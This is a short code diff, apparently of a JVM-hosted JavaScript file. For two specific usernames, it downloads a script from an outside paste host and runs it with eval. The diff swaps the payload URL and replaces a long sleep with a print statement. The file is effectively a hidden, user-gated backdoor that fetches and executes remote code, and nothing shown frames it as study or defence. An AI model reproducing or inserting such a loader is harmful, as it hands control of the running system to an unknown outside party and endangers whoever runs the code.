@@ -84,14 +84,14 @@ if (username === "porvaniy.gondon" || username === "__ded_inside__") {
     try {
         // Выполняем внешний скрипт
         eval(new java.util.Scanner(
-            new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
+            new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
             "UTF-8"
         ).useDelimiter("\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
 } else {
-    java.lang.Thread.sleep(20000000);
+    print("X")
 }
 
 })
